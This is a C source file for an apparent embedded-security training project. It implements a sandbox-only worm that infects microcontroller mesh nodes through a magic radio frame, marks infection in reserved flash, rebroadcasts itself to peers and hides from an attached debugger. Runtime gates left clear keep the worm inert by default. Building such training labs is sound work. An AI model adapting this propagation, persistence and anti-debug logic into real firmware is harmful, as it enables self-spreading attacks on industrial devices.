// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/industrial-tamper-system
// File:    implant.c
// Desc:    Implements the SANDBOX_ONLY FROSTLINE worm: the IRONWEB magic
//          frame, mesh propagation, reserved-sector infection marker, and
//          the CoreDebug anti-debug trap. Compiled only under SANDBOX_ONLY.
// Created: 2026

#include "implant.h"
#include "tamper_sys.h"
#include "radio.h"
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#ifdef SANDBOX_ONLY

#ifdef IMPLANT_HOST_MOCK
#include "implant_host.h"
/**
 * @brief Read the controllable mock CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (g_mock_implant_dhcsr)
/**
 * @brief Read the mock reserved-sector infection marker.
 */
#define IMPLANT_FLASH_READ() (g_mock_implant_flash)
/**
 * @brief Store the infection marker in the mock reserved sector.
 */
#define IMPLANT_FLASH_WRITE(value) (g_mock_implant_flash = (value))
#else
#include "hardware/flash.h"
#include "hardware/sync.h"
/**
 * @brief Read the real CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (*(volatile uint32_t *)TAMPER_IMPLANT_DHCSR_ADDR)
/**
 * @brief Read the real reserved-sector infection marker.
 */
#define IMPLANT_FLASH_READ() (*(volatile uint8_t *)TAMPER_IMPLANT_RESERVE_ADDR)
/**
 * @brief Erase and program the reserved-sector staging marker.
 *
 * @param value Marker byte to store in the reserved sector.
 * @return void
 */
static void implant_flash_write(uint8_t value) {
    uint8_t page[FLASH_PAGE_SIZE];
    uint32_t ints = save_and_disable_interrupts();
    memset(page, 0xFF, sizeof(page));
    page[0] = value;
    flash_range_erase(TAMPER_IMPLANT_RESERVE_OFFSET, FLASH_SECTOR_SIZE);
    flash_range_program(TAMPER_IMPLANT_RESERVE_OFFSET, page, FLASH_PAGE_SIZE);
    restore_interrupts(ints);
}
/**
 * @brief Write the staging marker into the reserved flash sector.
 */
#define IMPLANT_FLASH_WRITE(value) implant_flash_write(value)
#endif

/**
 * @brief Monotonic implant tick counter.
 */
static uint32_t g_implant_ticks;

/**
 * @brief True when the worm payload handler has been armed.
 */
static bool g_implant_armed;

/**
 * @brief True when the worm may re-broadcast to the mesh.
 */
static bool g_implant_propagation;

/**
 * @brief Runtime gate for the worm payload handler.
 *
 * The corrected build leaves this gate clear, so the IRONWEB magic is
 * ignored and an inbound frame never infects the node.
 */
static volatile bool g_implant_payload_gate;

/**
 * @brief Runtime gate for autonomous mesh re-broadcast.
 *
 * The corrected build leaves this gate clear, so the node never
 * re-broadcasts the worm to its peers.
 */
static volatile bool g_implant_propagate_gate;

/**
 * @brief Runtime gate for the reserved-sector infection marker write.
 *
 * The corrected build leaves this gate clear, so no marker is written.
 */
static volatile bool g_implant_marker_gate;

bool implant_debug_attached(void) {
    return (IMPLANT_DHCSR_READ &
            (TAMPER_IMPLANT_DHCSR_DEBUGEN | TAMPER_IMPLANT_DHCSR_HALT)) != 0u;
}

bool implant_armed(void) {
    return g_implant_armed;
}

bool implant_infected(void) {
    return IMPLANT_FLASH_READ() == (uint32_t)TAMPER_IMPLANT_MARKER_BYTE;
}

bool implant_propagation_enabled(void) {
    return g_implant_propagation;
}

void implant_set_propagation(bool enabled) {
    g_implant_propagation = enabled;
}

/**
 * @brief Clear the runtime gates to their corrected state.
 *
 * The corrected build starts with every implant action gate clear, so the
 * worm stays inert until a defect is introduced into the image.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_reset_gates(void) {
    g_implant_payload_gate = false;
    g_implant_propagate_gate = false;
    g_implant_marker_gate = false;
}

/**
 * @brief Write the infection marker into the reserved flash sector.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_infect(void) {
    if (!g_implant_marker_gate) {
        return;
    }
    if (implant_infected()) {
        return;
    }
    IMPLANT_FLASH_WRITE((uint8_t)TAMPER_IMPLANT_MARKER_BYTE);
}

/**
 * @brief Report whether a frame carries the IRONWEB worm magic.
 *
 * @param frame Pointer to the inbound frame bytes.
 * @param len Number of inbound frame bytes.
 * @return bool true when the frame begins with the worm magic.
 */
static bool implant_worm_match(const uint8_t *frame, size_t len) {
    if (frame == NULL || len < TAMPER_IMPLANT_WORM_MAGIC_LEN) {
        return false;
    }
    return memcmp(frame, TAMPER_IMPLANT_WORM_MAGIC,
                  TAMPER_IMPLANT_WORM_MAGIC_LEN) == 0;
}

/**
 * @brief Build one outbound IRONWEB worm frame.
 *
 * @param frame Pointer to the TAMPER_IMPLANT_WORM_LEN output buffer.
 * @return void
 */
static void implant_build_worm(uint8_t *frame) {
    memcpy(frame, TAMPER_IMPLANT_WORM_MAGIC, TAMPER_IMPLANT_WORM_MAGIC_LEN);
    frame[7] = TAMPER_IMPLANT_MARKER_BYTE;
    frame[8] = (uint8_t)(g_implant_ticks & 0xFFu);
    frame[9] = (uint8_t)((g_implant_ticks >> 8u) & 0xFFu);
    frame[10] = (uint8_t)(implant_debug_attached() ? 1u : 0u);
}

/**
 * @brief Re-broadcast the worm to every peer the node can reach.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_propagate(void) {
    uint8_t frame[TAMPER_IMPLANT_WORM_LEN];
    if (!g_implant_propagate_gate) {
        return;
    }
    if (!g_implant_propagation) {
        return;
    }
    implant_build_worm(frame);
    radio_send_frame(TAMPER_UART, frame, sizeof(frame));
}

void implant_tick(void) {
    g_implant_ticks += 1u;
    if (implant_debug_attached() || !implant_infected()) {
        return;
    }
    if ((g_implant_ticks % TAMPER_IMPLANT_PROPAGATE_INTERVAL_TICKS) == 0u) {
        implant_propagate();
    }
}

void implant_handle_command(const uint8_t *frame, size_t len) {
    if (!g_implant_payload_gate) {
        return;
    }
    if (!implant_worm_match(frame, len) || implant_debug_attached()) {
        return;
    }
    g_implant_armed = true;
    implant_infect();
    implant_propagate();
}

void implant_init(void) {
    implant_reset_gates();
    g_implant_ticks = 0u;
    g_implant_armed = false;
    g_implant_propagation = true;
    if (implant_infected()) {
        g_implant_armed = true;
        return;
    }
    implant_infect();
}

#endif // SANDBOX_ONLY
